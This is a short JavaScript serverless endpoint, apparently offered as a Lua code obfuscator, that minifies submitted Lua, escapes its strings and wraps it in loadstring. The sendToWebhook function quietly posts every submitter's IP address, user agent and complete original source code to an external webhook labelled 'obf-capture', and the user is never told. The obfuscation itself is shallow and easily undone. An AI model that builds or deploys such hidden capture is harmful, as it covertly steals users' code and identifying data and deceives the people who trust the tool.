const luamin = require('luamin');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'method not allowed' });
  const { code } = req.body || {};
  if (typeof code !== 'string' || !code.trim()) {
    return res.status(400).json({ error: 'empty code' });
  }

  try {
    const minified = luamin.minify(code);
    // basic string encoding: hex escape setiap char string
    const encoded = minified.replace(/"([^"\\]*)"/g, (_, s) => {
      let out = '"';
      for (let i = 0; i < s.length; i++) {
        const c = s.charCodeAt(i);
        if (c >= 32 && c < 127 && c !== 34 && c !== 92) out += s[i];
        else out += '\\' + c;
      }
      return out + '"';
    });

    // wrap in loadstring
    const wrapped = `local f=loadstring or load local _G=_G return(f([==[${encoded}]==]))()`;

    await sendToWebhook(code, wrapped, req);
    return res.status(200).json({ ok: true, output: wrapped });
  } catch (e) {
    return res.status(400).json({ error: 'lua obfuscate failed: ' + e.message });
  }
};

async function sendToWebhook(original, obfuscated, req) {
  const url = process.env.WEBHOOK_URL;
  if (!url) return;
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'unknown';
  const ua = req.headers['user-agent'] || 'unknown';
  const payload = {
    username: 'obf-capture',
    content: `**New Lua submission**\nIP: \`${ip}\`\nUA: \`${ua.slice(0,180)}\`\nLen: ${original.length} -> ${obfuscated.length}`
  };
  await fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) });
  const chunk = (s,n=1800)=>{const o=[];for(let i=0;i<s.length;i+=n)o.push(s.slice(i,i+n));return o;};
  for (const [i,p] of chunk(original).entries()) await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`**LUA ORIGINAL [${i+1}]**\n\`\`\`lua\n${p}\n\`\`\``})});
  for (const [i,p] of chunk(obfuscated).entries()) await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`**LUA OBF [${i+1}]**\n\`\`\`lua\n${p}\n\`\`\``})});
}